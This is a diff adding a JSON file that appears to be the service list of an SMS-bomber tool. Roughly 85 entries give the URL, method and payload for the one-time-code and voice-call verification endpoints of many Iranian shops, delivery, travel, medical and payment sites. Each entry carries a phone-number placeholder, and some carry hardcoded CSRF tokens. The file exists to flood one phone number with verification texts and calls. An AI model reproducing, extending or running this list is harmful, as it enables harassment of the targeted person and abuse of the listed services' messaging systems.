@@ -1,0 +1,871 @@
+[
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://api.tapsi.food/v1/api/Authentication/otp",
+      "Method": "POST",
+      "Payload": {
+        "cellPhone": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://api.bimesho.com/api/v1/auth/otp/send",
+      "Method": "POST",
+      "Payload": {
+        "username": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://api.azkivam.com/auth/login",
+      "Method": "POST",
+      "Payload": {
+        "mobileNumber": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://api.komodaa.com/api/v2.6/loginRC/request",
+      "Method": "POST",
+      "Payload": {
+        "phone_number": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "Method": "POST",
+      "URL": "https://account4all.ir/ajax?phone_or_email=0{{num}}&token=&username=&email=&phone=&register-security=e6b81232fd&_wp_http_referer=%2F&phone_or_email=0{{num}}&action=ajaxotpregisterrequest"
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "Method": "POST",
+      "URL": "https://roshapharmacy.com/signin?user_mobile=0{{num}}&confirm_code=&popup=1&signin=1"
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://www.vitrin.shop/api/v1/user/request_code",
+      "Method": "POST",
+      "Payload": {
+        "phone_number": "0{{num}}",
+        "forgot_password": false
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://www.karnaval.ir/api-2/graphql",
+      "Payload": {
+        "queryId": "0edebe0df353cee7f11614a37087371f",
+        "variables": {
+          "phone": "0{{num}}",
+          "isSecondAttempt": false
+        }
+      },
+      "Method": "POST"
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://ids.tapsi.shop/authCustomer/CreateOtpForRegister",
+      "Payload": {
+        "user": "0{{num}}"
+      },
+      "Method": "POST"
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://ws.alibaba.ir/api/v3/account/mobile/otp",
+      "Method": "POST",
+      "Payload": {
+        "phoneNumber": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://www.miare.ir/p/restaurant/#/login?phone=0{{num}}",
+      "Method": "GET"
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://bck.behtarino.com/api/v1/users/jwt_phone_verification/",
+      "Method": "POST",
+      "Payload": {
+        "phone": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://khodro45.com/api/v1/customers/otp/",
+      "Method": "POST",
+      "Payload": {
+        "mobile": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://api.pindo.ir/v1/user/login-register/",
+      "Method": "POST",
+      "Payload": {
+        "phone": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://admin.zoodex.ir/api/v1/login/check",
+      "Method": "POST",
+      "Payload": {
+        "mobile": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://messengerg2c4.iranlms.ir/",
+      "Method": "POST",
+      "Payload": {
+        "se": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL",
+      "Method": "POST",
+      "Payload": {
+        "mobile": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode",
+      "Method": "POST",
+      "Payload": {
+        "userName": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://api.shab.ir/api/fa/sandbox/v_1_4/auth/login-otp",
+      "Method": "POST",
+      "Payload": {
+        "mobile": "0{{num}}",
+        "country_code": "+98"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
+      "Method": "POST",
+      "Payload": {
+        "UserName": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://nobat.ir/api/public/patient/login/phone",
+      "Method": "POST",
+      "Payload": {
+        "mobile": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://www.riiha.ir/api/v1.0/authenticate",
+      "Method": "POST",
+      "Payload": {
+        "mobile": "0{{num}}",
+        "mobile_code": "",
+        "type": "mobile"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://api.mohit.online/api/auth/login",
+      "Method": "POST",
+      "Payload": {
+        "username": "0{{num}}",
+        "app": "market",
+        "token": ""
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://www.sheypoor.com/api/v10.0.0/auth/send",
+      "Method": "POST",
+      "Payload": {
+        "username": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode",
+      "Method": "POST",
+      "Payload": {
+        "Parametrs": {
+          "ApplicationType": "Web",
+          "ApplicationUniqueToken": null,
+          "ApplicationVersion": "1.0.0",
+          "MobileNumber": "0{{num}}"
+        }
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://www.simkhanapi.ir/api/users/registerV2",
+      "Method": "POST",
+      "Payload": {
+        "mobileNumber": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://api.digikala.com/v1/user/authenticate/",
+      "Method": "POST",
+      "Payload": {
+        "username": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://tikban.com/Account/LoginAndRegister",
+      "Method": "POST",
+      "Payload": {
+        "cellPhone": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://www.offdecor.com/index.php?route=account/login/sendCode",
+      "Method": "POST",
+      "Payload": {
+        "phone": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://exo.ir/index.php?route=account/mobile_login",
+      "Method": "POST",
+      "Payload": {
+        "mobile_number": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://virgool.io/api/v1.4/auth/verify",
+      "Method": "POST",
+      "Payload": {
+        "method": "phone",
+        "identifier": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://client.api.paklean.com/user/resendCode",
+      "Method": "POST",
+      "Payload": {
+        "username": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://shadmessenger12.iranlms.ir/",
+      "Method": "POST",
+      "Payload": {
+        "api_version": "3",
+        "method": "sendCode",
+        "data": {
+          "phone_number": "098{{num}}",
+          "send_type": "SMS"
+        }
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://api.snapp.doctor/core/Api/Common/v1/sendVerificationCode/0{{num}}/sms?cCode=%2B98",
+      "Method": "GET"
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://www.pakhsh.shop/wp-admin/admin-ajax.php",
+      "Method": "POST",
+      "Payload": {
+        "action": "digits_check_mob",
+        "countrycode": "+98",
+        "mobileNo": "0{{num}}",
+        "csrf": "fdaa7fc8e6",
+        "login": "2",
+        "username": "",
+        "email": "",
+        "captcha": "",
+        "captcha_ses": "",
+        "json": "1",
+        "whatsapp": "0"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://crm.see5.net/api_ajax/sendotp.php",
+      "Method": "POST",
+      "Payload": {
+        "mobile": "0{{num}}",
+        "action": "sendsms"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://www.drsaina.com/RegisterLogin?ReturnUrl=%2Fconsultation",
+      "Method": "POST",
+      "Payload": {
+        "PhoneNumber": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://i.devslop.app/app/ifollow/api/otp.php",
+      "Method": "POST",
+      "Payload": {
+        "number": "0{{num}}",
+        "state": "number"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass",
+      "Method": "POST",
+      "Payload": {
+        "cellphone": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://pirankalaco.ir/shop/SendPhone.php",
+      "Method": "POST",
+      "Payload": {
+        "phone": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://moshaveran724.ir/m/pms.php",
+      "Method": "POST",
+      "Payload": {
+        "againkey": "0{{num}}",
+        "cache": "false"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://api.alopeyk.com/api/v2/login?platform=pwa",
+      "Method": "POST",
+      "Payload": {
+        "phone": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://api.alopeyk.com/safir-service/api/v1/login",
+      "Method": "POST",
+      "Payload": {
+        "phone": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://api.iranamlaak.net/authenticate/send/otp/to/mobile/via/sms",
+      "Method": "POST",
+      "Payload": {
+        "AgencyMobile": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://novinbook.com/index.php?route=account/phone",
+      "Method": "POST",
+      "Payload": {
+        "phone": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://tajtehran.com/RegisterRequest",
+      "Method": "POST",
+      "Payload": {
+        "mobile": "0{{num}}",
+        "password": "mamad1234"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://my.limoome.com/api/auth/login/otp",
+      "Method": "POST",
+      "Payload": {
+        "mobileNumber": "{{num}}",
+        "country": "1"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://tagmond.com/phone_number",
+      "Method": "POST",
+      "Payload": {
+        "phone_number": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://ghabzino.com",
+      "Method": "POST",
+      "Payload": {
+        "MobileNumber": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://janebi.com/signin",
+      "Method": "POST",
+      "Payload": {
+        "resend": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://baradarantoy.ir/send_confirm_sms_ajax.php",
+      "Method": "POST",
+      "Payload": {
+        "user_tel": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://chechilas.com/user/login",
+      "Method": "POST",
+      "Payload": {
+        "mob": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://badparak.com/register/request_verification_code",
+      "Method": "POST",
+      "Payload": {
+        "mobile": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://ubike.ir/index.php?route=extension/module/websky_otp/send_code",
+      "Method": "POST",
+      "Payload": {
+        "telephone": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://bartarinha.com/Advertisement/Users/RequestLoginMobile",
+      "Method": "POST",
+      "Payload": {
+        "mobileNo": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://manoshahr.ir/jq.php",
+      "Method": "POST",
+      "Payload": {
+        "mobile": "0{{num}}",
+        "class_name": "public_login",
+        "function_name": "sendCode"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://www.nalinoco.com/api/customers/login-register",
+      "Method": "POST",
+      "Payload": {
+        "mobile": "0{{num}}",
+        "step": "1"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://martday.ir/api/customer/member/register/",
+      "Method": "POST",
+      "Payload": {
+        "email": "0{{num}}",
+        "accept_term": "on"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://electrastore.ir/index.php?route=extension/module/websky_otp/send_code",
+      "Method": "POST",
+      "Payload": {
+        "telephone": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://dastaneman.com/User/SendCode",
+      "Method": "POST",
+      "Payload": {
+        "mobile": "0098{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://noavarpub.com/logins/login.php",
+      "Method": "POST",
+      "Payload": {
+        "phone": "0{{num}}",
+        "submit": "123"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://www.kanoonbook.ir/store/customer_otp",
+      "Method": "POST",
+      "Payload": {
+        "customer_username": "{{num}}",
+        "task": "customer_phone"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://apix.snappshop.co/auth/v1/pre-login",
+      "Method": "POST",
+      "Payload": {
+        "mobile": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://shimashoes.com/api/customer/member/register/",
+      "Method": "POST",
+      "Payload": {
+        "email": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://hamrahsport.com/send-otp",
+      "Method": "POST",
+      "Payload": {
+        "cell": "{{num}}",
+        "send_otp": "1"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://parkbag.com/fa/Account/RegisterOrLoginByMobileNumber",
+      "Method": "POST",
+      "Payload": {
+        "MobaileNumber": "{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://www.adinehbook.com/gp/flex/sign-in.html",
+      "Method": "POST",
+      "Payload": {
+        "action": "sign",
+        "phone_cell_or_email": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://sunnybook.ir/Home/RegisterUser",
+      "Method": "POST",
+      "Payload": {
+        "mobile": "{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://mahouney.com/fa/Account/RegisterOrLoginByMobileNumber",
+      "Method": "POST",
+      "Payload": {
+        "MobaileNumber": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://ickala.com/",
+      "Method": "POST",
+      "Payload": {
+        "controller": "SendSMS",
+        "fc": "module",
+        "module": "loginbymobile",
+        "SubmitSmsSend": "1",
+        "ajax": "true",
+        "otp_mobile_num": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://novinparse.com/Page/PageAction.aspx",
+      "Method": "POST",
+      "Payload": {
+        "Action": "SendVerifyCode",
+        "mobile": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://nikanbike.com/",
+      "Method": "POST",
+      "Payload": {
+        "controller": "authentication",
+        "fc": "module",
+        "module": "iverify",
+        "phone_mobile": "0{{num}}",
+        "SubmitCheck": ""
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://queenaccessories.ir/api/v1/sessions/login_request",
+      "Method": "POST",
+      "Payload": {
+        "mobile_phone": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://vinaaccessory.com/api/v1/sessions/login_request",
+      "Method": "POST",
+      "Payload": {
+        "mobile_phone": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://piinkstore.ir/api/v1/sessions/login_request",
+      "Method": "POST",
+      "Payload": {
+        "mobile_phone": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://app.mydigipay.com/digipay/api/users/send-sms",
+      "Method": "POST",
+      "Payload": {
+        "cellNumber": "0{{num}}",
+        "device": {
+          "deviceId": "a16e6255-17c3-431b-b047-3f66d24c286f",
+          "deviceModel": "WEB_BROWSER",
+          "deviceAPI": "WEB_BROWSER",
+          "osName": "WEB"
+        }
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://mobogift.com/signin",
+      "Method": "POST",
+      "Payload": {
+        "username": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://www.irantic.com/api/login/request",
+      "Method": "POST",
+      "Payload": {
+        "mobile": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp",
+      "Method": "POST",
+      "Payload": {
+        "cellphone": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "sms",
+    "Request": {
+      "URL": "https://api.watchonline.shop/api/v1/otp/request",
+      "Method": "POST",
+      "Payload": {
+        "mobile": "0{{num}}"
+      }
+    }
+  },
+  {
+    "Type": "call",
+    "Request": {
+      "URL": "https://novinbook.com/index.php?route=account/phone",
+      "Method": "POST",
+      "Payload": {
+        "phone": "0{{num}}",
+        "call": "yes"
+      }
+    }
+  },
+  {
+    "Type": "call",
+    "Request": {
+      "URL": "https://client.api.paklean.com/user/resendVoiceCode",
+      "Method": "POST",
+      "Payload": {
+        "username": "0{{num}}"
+      }
+    }
+  }
+]
